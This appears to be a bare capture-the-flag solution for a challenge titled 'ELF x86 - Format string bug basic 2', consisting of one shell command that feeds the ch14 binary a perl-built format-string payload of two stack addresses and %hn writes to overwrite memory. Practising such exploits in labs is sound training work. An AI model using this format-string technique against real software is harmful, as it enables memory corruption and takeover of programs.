# ELF x86 - Format string bug basic 2
./ch14 "$(perl -e 'print "\x28\xfb\xff\xbf" . "\x2a\xfb\xff\xbf" . "%48871x%9\$hn" . "%8126x%10\$hn"')"
